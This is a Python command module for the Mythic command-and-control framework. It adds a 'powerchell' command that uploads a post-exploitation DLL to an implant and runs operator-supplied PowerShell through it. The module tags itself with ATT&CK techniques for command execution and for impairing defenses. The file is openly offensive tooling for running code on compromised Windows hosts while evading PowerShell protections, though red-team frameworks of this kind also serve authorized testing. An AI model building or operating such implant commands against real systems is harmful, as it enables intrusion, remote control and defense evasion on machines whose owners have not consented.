from mythic_container.MythicCommandBase import *
import json
from .utils.bof_utilities import *
from .utils.mythicrpc_utilities import *
from .utils.agent_global_settings import *

class PowerchellArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="powershell_params",
                cli_name="Command",
                display_name="Command",
                type=ParameterType.String,
                description="PowerShell command to execute.",
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception(
                "Require a PowerShell command to execute.\n\tUsage: {}".format(
                    PowerchellCommand.help_cmd
                )
            )
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=1)
            self.add_arg("powershell_params", parts[1])

class PowerchellCommand(CoffCommandBase):
    cmd = "powerchell"
    needs_admin = False
    help_cmd = "powerchell -Command [command]"
    description = "Execute PowerShell script using PowerChell post-ex DLL."
    version = 1
    script_only = True
    author = "@c0rnbread"
    argument_class = PowerchellArguments
    attackmapping = ["T1059", "T1562"]
    attributes = CommandAttributes(
        dependencies=["execute_dll"],
        alias=True,
        suggested_command=False
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        # Set display parameters
        response.DisplayParams = "{}".format(taskData.args.get_arg("powershell_params"))

        # Upload desired module if it hasn't been before (per payload uuid)
        file_name = "powerchell.x64.dll"
        succeeded = await upload_module_if_missing(file_name=file_name, taskData=taskData)
        if not succeeded:
            response.Success = False
            response.Error = f"Failed to upload or check module \"{file_name}\"."


        dll_arguments = ""

        #
        # Add any PowerShell Imports
        #
        powershell_import_file = POWER_SHELL_IMPORT.get_file()
        if powershell_import_file != "":
            powershell_import_buffer = await POWER_SHELL_IMPORT.get_buffer()
            dll_arguments += powershell_import_buffer.decode("utf-8") + "\n"
            logging.info(f"[POWERCHELL] Importing buffer of {len(powershell_import_buffer)} bytes")
        else:
            powershell_import_buffer = None

        # Add user arguments
        dll_arguments += taskData.args.get_arg("powershell_params")

        # Execute PowerChell
        subtask = await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                taskData.Task.ID,
                CommandName="execute_dll",
                SubtaskCallbackFunction="coff_completion_callback",
                Params=json.dumps({
                    "dll_name": file_name,
                    "dll_arguments": dll_arguments
                }),
                Token=taskData.Task.TokenID,
            )
        )

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp